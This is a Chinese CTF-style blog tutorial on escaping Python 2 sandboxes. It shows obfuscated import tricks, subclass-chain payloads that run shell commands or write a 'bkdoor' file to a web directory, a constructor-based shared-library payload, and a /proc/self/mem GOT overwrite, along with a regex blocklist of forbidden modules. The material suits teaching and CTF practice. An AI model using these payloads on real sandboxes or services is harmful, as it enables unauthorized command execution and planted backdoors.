---
title: 初探Python沙箱逃逸
date: 2020-04-02 19:03:42
tags: ctf
---

接触过的 Python 沙箱逃逸不是很多，参考了很多大佬的博客。本文主要基于 Python2。

<!-- more -->

> 沙箱逃逸，就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终拿到 shell。

对于 Python2 的沙箱逃逸而言，实现目的的最终想法有以下几个：

- 使用 `os` 包中的 `popen`、`system` 两个函数
- 使用 `commands` 模块中的方法
- 使用 `subprocess` 模块中的方法
- 使用写文件到指定位置，再使用其他辅助手段

总体来说，就是使用以下几个函数来执行命令：

```python
import os
import subprocess
import commands

os.system('ifconfig')
os.popen('ifconfig')
commands.getoutput('ifconfig')
commands.getstatusoutput('ifconfig')
subprocess.call(['ifconfig'], shell=True)
```

下面记录针对不同情况采取的绕过方法。

> PS：获取当前的 Python 环境
>
> ```python
> import sys
> print sys.version
> ```

# 一些有用的模块和函数

除了上面提到的几个模块，还有几种可以曲线救国。

## `timeit` 模块

用于测试小代码片段的运行时间（`number` 即表示测试的次数）：

```python
import timeit
timeit.timeit("__import__('os').system('pwd')", number=1)
```

## `platform` 模块

类似 `os` 模块的 `popen`，可以执行命令：

```python
import platform
platform.popen('pwd').read()
```

## `codecs` 模块

可以用来读文件：

```python
import codecs
codecs.open('code.py').read()
```

## `exec()`、`eval()`、`execfile()`、`compile()` 函数

- `exec()`：动态运行代码段，返回值为 `None`
- `eval()`：计算单个表达式的值，有返回值
- `execfile()`：动态运行某个文件中的代码
- `compile()`：将一个字符串编译为字节代码

```python
In [1]: o = compile('a = 1 + 1', '<string>', 'exec')

In [2]: exec(o)

In [3]: print a
2
```

# 字符串过滤的绕过

如果是某个字符串被过滤了，可以对它进行一些变换：

```python
In [1]: d = {'key': 1}

In [2]: print d['yek'[::-1]]
1
```

如果是关键字被过滤了，可以使用 `getattr`。`getattr` 接收两个参数，第一个是模块或对象，第二个是一个字符串。它会在模块或对象中搜索指定的函数或属性：

```python
In [1]: import os

In [2]: getattr(os, '676574637764'.decode('hex'))()
Out[2]: '/usr/lib/python2.7'
```

# `import` 花式处理

`import` 关键字用来导入包，沙箱中对一些包或是函数进行了屏蔽，从 `import` 的不同方法到 `import` 的本质有多种不同的绕过方法。

## Basic

防御最基础的思路就是正则匹配代码中的内容，检测是否调用了 `import`：

```python
In [1]: import re
   ...: code = 'import os'
   ...: pat = re.compile('import\s+(os|commands|subprocess|sys)')
   ...: if pat.search(code) != None:
   ...:     raise Exception, 'Detected forbidden module.'
   ...:
---------------------------------------------------------------------------
Exception                                 Traceback (most recent call last)
<ipython-input-1-db50a328bbb7> in <module>()
      3 pat = re.compile('import\s+(os|commands|subprocess|sys)')
      4 if pat.search(code) != None:
----> 5     raise Exception, 'Detected forbidden module.'

Exception: Detected forbidden module.
```

绕过的方式也很简单，使用其他的方式来导入其他包名：

- `import` 关键字
- `__import__` 函数
- `importlib` 库

```python
__import__('Y29tbWFuZHM='.decode('base64')).getoutput('pwd')

import importlib
x = importlib.import_module('pbzznaqf'.decode('rot_13'))
print x.getoutput('pwd')
```

## Medium

在 Python2 中不用直接使用的内置函数被称为 builtin 函数，跟随 `__builtin__` 模块自动被加载。例如 `open()`、`int()`、`chr()` 这些函数相当于如下形式：

```python
__builtin__.open()
__builtin__.int()
__builtin__.chr()
```

防御的一种方法就是用 `del` 把这些函数删除：

```python
In [1]: del __builtin__.chr

In [2]: chr(1)
---------------------------------------------------------------------------
NameError                                 Traceback (most recent call last)
<ipython-input-2-288f58b79c7d> in <module>()
----> 1 chr(1)

NameError: name 'chr' is not defined
```

绕过的方法是使用 `reload` 来重新加载 `__builtin__` 模块：

```python
In [1]: reload(__builtin__)
Out[1]: <module '__builtin__' (built-in)>

In [2]: chr(1)
Out[2]: '\x01'
```

同时 `reload` 也是 `__builtin__` 下的一个函数，如果删除了它该怎么办？答案是使用 `imp` 模块，也可以对 `__builtin` 进行重新导入：

```python
In [1]: import imp

In [2]: imp.reload(__builtin__)
Out[2]: <module '__builtin__' (built-in)>

In [3]: chr(1)
Out[3]: '\x01'
```

## Advance

Python 中的所有包都是以 `.py` 文件的形式存在的，说明所有 `import` 进来的包一开始都预先在某个位置了。一般和系统相关的信息都在 `sys` 下，使用 `sys.path` 查看各个包的路径：

```python
In [1]: import sys

In [2]: sys.path
Out[2]:
['',
 '/usr/local/bin',
 '/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python27.zip',
 '/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7',
 '/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-darwin',
 '/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-mac',
 '/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-mac/lib-scriptpackages',
 '/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-tk',
 '/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-old',
 '/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload',
 '~/Library/Python/2.7/lib/python/site-packages',
 '/usr/local/lib/python2.7/site-packages',
 '/usr/local/lib/python2.7/site-packages/oletools-0.54.2-py2.7.egg',
 '/usr/local/lib/python2.7/site-packages/msoffcrypto_tool-4.10.1-py2.7.egg',
 '/usr/local/lib/python2.7/site-packages/colorclass-2.2.0-py2.7.egg',
 '/usr/local/lib/python2.7/site-packages/easygui-0.98.1-py2.7.egg',
 '/usr/local/lib/python2.7/site-packages/olefile-0.46-py2.7.egg',
 '/usr/local/lib/python2.7/site-packages/ida_netnode-1.1-py2.7.egg',
 '/usr/local/lib/python2.7/site-packages/wasm-1.2-py2.7.egg',
 '~/Tools/python-uncompyle6',
 '/usr/local/lib/python2.7/site-packages/PyMySQL-0.9.3-py2.7.egg',
 '/usr/local/lib/python2.7/site-packages/pysm4-0.7-py2.7.egg',
 '/usr/local/lib/python2.7/site-packages/gtk-2.0',
 '/usr/local/lib/python2.7/site-packages/gtk-2.0',
 '/usr/local/lib/python2.7/site-packages/IPython/extensions',
 '~/.ipython']
```

`sys` 下还有一个 `modules`，返回一个字典，其中可以查看各个模块对应的系统路径。如果修改这个字典中的内容，前面使用的方法就都失效了：

```python
In [1]: import sys

In [2]: sys.modules['os'] = None

In [3]: import os
---------------------------------------------------------------------------
ImportError                               Traceback (most recent call last)
<ipython-input-9-543d7f3a58ae> in <module>()
----> 1 import os

ImportError: No module named os

In [4]: __import__('os')
---------------------------------------------------------------------------
ImportError                               Traceback (most recent call last)
<ipython-input-10-1b9b14481c7e> in <module>()
----> 1 __import__('os')

ImportError: No module named os

In [5]: import importlib

In [6]: importlib.import_module('os')
---------------------------------------------------------------------------
ImportError                               Traceback (most recent call last)
<ipython-input-12-51afbccc7d3c> in <module>()
----> 1 importlib.import_module('os')

/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/importlib/__init__.pyc in import_module(name, package)
     35             level += 1
     36         name = _resolve_name(name[level:], package, level)
---> 37     __import__(name)
     38     return sys.modules[name]

ImportError: No module named os
```

解决这种情况，就得尝试把对应的模块路径修复回来，一般默认的 `os` 模块是在 `/usr/bin/python2.7/os.py`：

```python
In [1]: import sys

In [2]: sys.modules['os'] = '/usr/lib/python2.7/os.py'

In [3]: import os
```

## Hell

如果把 `sys`、`os`、`reload` 等一系列模块都过滤掉了，使用什么方法来绕过呢？导入模块的过程其实就是把对应模块的代码执行一遍的过程，在知道模块对应路径的情况下，就可以相应地执行它：

```python
In [1]: execfile('/usr/lib/python2.7/os.py')

In [2]: system('pwd')
/usr/lib/python2.7
Out[2]: 0

In [3]: getcwd()
Out[3]: '/usr/lib/python2.7'
```

在 `execfile` 被禁止的情况下，还可以用 `open` 读入文件，并使用 `exec` 来执行相应的代码：

```python
In [1]: code = open('/usr/lib/python2.7/os.py', 'r').read()

In [2]: exec code

In [3]: getcwd()
Out[3]: '/usr/lib/python2.7'
```

# 各类内联函数和属性的使用

## `dir` 和 `__dict__`

`dir` 和 `__dict__` 可以用来查看类或对象下的所有属性信息：

```python
In [1]: class A():
    ...:     def __init__(self):
    ...:         self.a = 'a'
    ...:

In [2]: dir(A)
Out[2]: ['__doc__', '__init__', '__module__']

In [3]: A.__dict__
Out[3]:
{'__doc__': None,
 '__init__': <function __main__.__init__>,
 '__module__': '__main__'}
```

和 `sys.modules` 配合使用获得一个模块的引用：

```python
In [1]: import sys

In [2]: dir(sys.modules[__name__])
Out[2]:
['In',
 'Out',
 '_',
 '_11',
 '_12',
 '_13',
 '_14',
 '_15',
 '_8',
 '__',
 '___',
 '__builtin__',
 '__builtins__',
 '__doc__',
 '__name__',
 '__package__',
 '_dh',
 '_i',
 '_i1',
 '_i10',
 '_i11',
 '_i12',
 '_i13',
 '_i14',
 '_i15',
 '_i16',
 '_i17',
 '_i2',
 '_i3',
 '_i4',
 '_i5',
 '_i6',
 '_i7',
 '_i8',
 '_i9',
 '_ih',
 '_ii',
 '_iii',
 '_oh',
 '_sh',
 'd',
 'exit',
 'get_ipython',
 'os',
 'quit',
 's',
 'sys']
```

## `func_code` 的利用

函数的 `func_code` 属性可以被用来查看函数的参数个数以及变量，还能看到函数对应的字节码：

```python
In [1]: def f(x, y, z):
    ...:     a = 'secret'
    ...:     b = 2333
    ...:

In [2]: f.func_code.co_argcount
Out[2]: 3

In [3]: f.func_code.co_consts
Out[3]: (None, 'secret', 2333)

In [4]: f.func_code.co_code
Out[4]: 'd\x01\x00}\x03\x00d\x02\x00}\x04\x00d\x00\x00S'
```

使用 `dis` 库可以获取函数对应汇编格式的字节码：

```python
In [1]: import dis

In [2]: dis.dis(f)
  2           0 LOAD_CONST               1 ('secret')
              3 STORE_FAST               3 (a)

  3           6 LOAD_CONST               2 (2333)
              9 STORE_FAST               4 (b)
             12 LOAD_CONST               0 (None)
             15 RETURN_VALUE
```

## `__mro__` 和 `__bases__` 属性

Python 允许多重继承，即一个子类有多个父类。`__mro__` 属性可以用来查看一个子类所有的父类；`__bases__` 可以获取上一层的继承关系：

```python
In [1]: class A(object): pass

In [2]: class B(object): pass

In [3]: class C(A, B): pass

In [4]: C.__bases__
Out[4]: (__main__.A, __main__.B)

In [5]: C.__mro__
Out[5]: (__main__.C, __main__.A, __main__.B, object)

In [6]: 1..__class__.__bases__
Out[6]: (object,)

In [7]: 1..__class__.__mro__
Out[7]: (float, object)

In [8]: ''.__class__.__bases__
Out[8]: (basestring,)

In [9]: ''.__class__.__mro__
Out[9]: (str, basestring, object)
```

比如在 `open` 等文件操作被限制的情况下可以用下面的方法读取文件内容（`__subclasses__` 即用来查看对象的所有子类；`Object` 的查询结果中第 40 个类为 `file`）：

```python
''.__class__.__mro__[-1].__subclasses__()[40]('/usr/lib/python2.7/os.py').read()
1..__class__.__bases__[0].__subclasses__()[40]('/usr/lib/python2.7/os.py').read()
```

其他的一些执行命令的方法（通过获取其他已经载入了 os 等模块的类进行调用）：

```python
# 执行系统命令
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].os.system('ls')
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").system("ls")')
# 重新载入__builtin__
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtin__['__import__']("os").system("ls")
# 读文件
().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()
# 写文件
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/bkdoor', 'w').write('123')
# 执行任意命令
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /var/www/html").read()')
```

可以编写一个函数对导入了 `os` 或 `sys` 的库进行一个遍历：

```python
#!/usr/bin/env python
all_modules = [
    'BaseHTTPServer', 'imaplib', 'shelve', 'Bastion', 'anydbm', 'imghdr', 'shlex', 'CDROM', 'argparse', 'imp', 'shutil', 'CGIHTTPServer', 'array', 'importlib', 'signal', 'ast', 'imputil', 'site', 'ConfigParser', 'asynchat', 'inspect', 'sitecustomize', 'Cookie', 'asyncore', 'io', 'smtpd', 'DLFCN', 'atexit', 'itertools', 'smtplib', 'audiodev', 'json', 'sndhdr', 'DocXMLRPCServer', 'audioop', 'keyword', 'socket', 'base64', 'lib2to3', 'spwd', 'FixTk', 'bdb', 'linecache', 'sqlite3', 'HTMLParser', 'binascii', 'linuxaudiodev', 'sre', 'IN', 'binhex', 'locale', 'sre_compile', 'MimeWriter', 'bisect', 'logging', 'sre_constants', 'Queue', 'bsddb', 'sre_parse', 'bz2', 'macpath', 'ssl', 'cPickle', 'macurl2path', 'stat', 'SimpleHTTPServer', 'cProfile', 'mailbox', 'statvfs', 'SimpleXMLRPCServer', 'cStringIO', 'mailcap', 'string', 'SocketServer', 'calendar', 'markupbase', 'stringold', 'StringIO', 'cgi', 'marshal', 'stringprep', 'TYPES', 'cgitb', 'math', 'strop', 'chunk', 'md5', 'struct', 'Tkconstants', 'cmath', 'mhlib', 'subprocess', 'cmd', 'mimetools', 'sunau', 'code', 'mimetypes', 'sunaudio', 'UserDict', 'codecs', 'mimify', 'symbol', 'UserList', 'codeop', 'mmap', 'symtable', 'UserString', 'collections', 'modulefinder', 'sys', 'colorsys', 'multifile', 'sysconfig', 'commands', 'multiprocessing', 'syslog', '__builtin__', 'compileall', 'mutex', 'tabnanny', '__future__', 'compiler', 'netrc', '_abcoll', 'contextlib', 'new', 'tarfile', '_ast', 'cookielib', 'nis', 'telnetlib', '_bisect', 'copy', 'nntplib', 'tempfile', '_bsddb', 'copy_reg', 'ntpath', 'termios', '_codecs', 'crypt', 'nturl2path', 'test', '_codecs_cn', 'csv', 'numbers', 'textwrap', '_codecs_hk', 'ctypes', 'opcode', '_codecs_iso2022', 'curses', 'operator', 'thread', '_codecs_jp', 'datetime', 'optparse', 'threading', '_codecs_kr', 'dbhash', 'os', 'time', '_codecs_tw', 'dbm', 'os2emxpath', 'timeit', '_collections', 'decimal', 'ossaudiodev', '_csv', 'difflib', 'parser', '_ctypes', 'dircache', 'pdb', '_ctypes_test', 'dis', 'pickle', '_curses', 'distutils', 'pickletools', '_curses_panel', 'doctest', 'pipes', '_elementtree', 'dumbdbm', 'pkgutil', 'toaiff', '_functools', 'dummy_thread', 'platform', 'token', '_hashlib', 'dummy_threading', 'plistlib', 'tokenize', '_heapq', 'email', 'popen2', 'trace', '_hotshot', 'encodings', 'poplib', 'traceback', '_io', 'ensurepip', 'posix', '_json', 'errno', 'posixfile', 'tty', '_locale', 'exceptions', 'posixpath', '_lsprof', 'fcntl', 'pprint', 'types', '_md5', 'filecmp', 'profile', 'unicodedata', '_multibytecodec', 'fileinput', 'pstats', 'unittest', '_multiprocessing', 'fnmatch', 'pty', 'urllib', '_osx_support', 'formatter', 'pwd', 'urllib2', '_pyio', 'fpformat', 'py_compile', 'urlparse', '_random', 'fractions', 'pyclbr', 'user', '_sha', 'ftplib', 'pydoc', 'uu', '_sha256', 'functools', 'pydoc_data', 'uuid', '_sha512', 'future_builtins', 'pyexpat', 'warnings', '_socket', 'gc', 'quopri', 'wave', '_sqlite3', 'genericpath', 'random', 'weakref', '_sre', 'getopt', 're', 'webbrowser', '_ssl', 'getpass', 'readline', 'whichdb', '_strptime', 'gettext', 'repr', 'wsgiref', '_struct', 'glob', 'resource', 'xdrlib', '_symtable', 'grp', 'rexec', 'xml', '_sysconfigdata', 'gzip', 'rfc822', 'xmllib', '_sysconfigdata_nd', 'hashlib', 'rlcompleter', 'xmlrpclib', '_testcapi', 'heapq', 'robotparser', 'xxsubtype', '_threading_local', 'hmac', 'runpy', 'zipfile', '_warnings', 'hotshot', 'sched', 'zipimport', '_weakref', 'htmlentitydefs', 'select', 'zlib', '_weakrefset', 'htmllib', 'sets', 'abc', 'httplib', 'sgmllib', 'aifc', 'ihooks', 'sha'
]
methods = ['os', 'sys', '__builtin__']

results = {}
for module in all_modules:
    results[module] = {
        'flag': 0,
        'result': {}
    }
    try:
        m = __import__(module)
        attrs = dir(m)
        for method in methods:
            if method in attrs:
                results[module]['flag'] = 1
                results[module]['result'][method] = '\033[1;31mYES\033[0m'
            else:
                results[module]['result'][method] = 'NO'
    except Exception as e:
        print module, e

for result in results:
    if results[result]['flag']:
        print '[*]', result
        for r in results[result]['result']:
            print '\t[+]', r, '=>', results[result]['result'][r]
```

# 伪 `private` 属性和函数

Python 中以双下划线开头的函数和属性是 `private` 的，但是这种 `private` 只是形式上的，表示这个函数不应该在本类之外的地方进行访问，而是否遵守则取决于具体的实现。公有的函数和属性，使用其名字直接进行访问；而私有的属性和函数，使用 `下划线+类名+函数名` 进行访问：

```python
In [1]: class A():
    ...:     __a = 1
    ...:     b = 2
    ...:     def __c(self):
    ...:         pass
    ...:     def d(self):
    ...:         pass
    ...:

In [2]: dir(A)
Out[2]: ['_A__a', '_A__c', '__doc__', '__module__', 'b', 'd']
```

# 构造 so 库

编译一个 so 库，并写入指定的路径：

```cpp
// gcc bkdoor.c -shared -fPIC -o libbkdoor.so
void my_init() __attribute__((constructor));
void my_init() {
    system("ls -la /home/ctf/ > /tmp/ls_home_ctf");
}
```

调用 ctypes 来载入 so 库：

```python
In [1]: # ''.__class__.__mro__[-1].__subclasses__()[235] => ctypes.CDLL

In [2]: # ''.__class__.__mro__[-1].__subclasses__()[236] => ctypes.LibraryLoader

In [3]: ''.__class__.__mro__[-1].__subclasses__()[236](''.__class__.__mro__[-1].__subclasses__()[235]).LoadLibrary('/tmp/libbkdoor.so')
Out[3]: <CDLL '/tmp/libbkdoor.so', handle 2831310 at 7ff2434184d0>

In [4]: __import__('os').system('cat /tmp/ls_home_ctf')
total 8
drwxr-xr-x 2 root root 4096 Apr  3 02:23 .
drwxr-xr-x 1 root root 4096 Apr  3 02:23 ..
-rw-r--r-- 1 root root    0 Apr  3 02:23 flag
Out[4]: 0
```

# 修改 GOT 表

类似 PWN 里的做法，可以把 `fopen` 的 GOT 改为 `system`。先用 objdump 查找：

```bash
/usr/bin ❯ objdump -R python | grep -E "fopen|system"
00000000008de2b8 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5
00000000008de8c8 R_X86_64_JUMP_SLOT  fopen64@GLIBC_2.2.5
```

一句话脚本：

```python
# 0x00000000008de2b8 => system
# 0x00000000008de8c8 => fopen
(lambda r, w:
    r.seek(0x00000000008de2b8) or
    w.seek(0x00000000008de8c8) or
    w.write(r.read(8)) or
    ().__class__.__bases__[0].__subclasses__()[40]('ls'))
(
    ().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'r'),
    ().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0)
)
```

# References

https://xz.aliyun.com/t/52
https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/
https://www.freebuf.com/articles/system/203208.html
https://bestwing.me/awesome-python-sandbox-in-ciscn.html
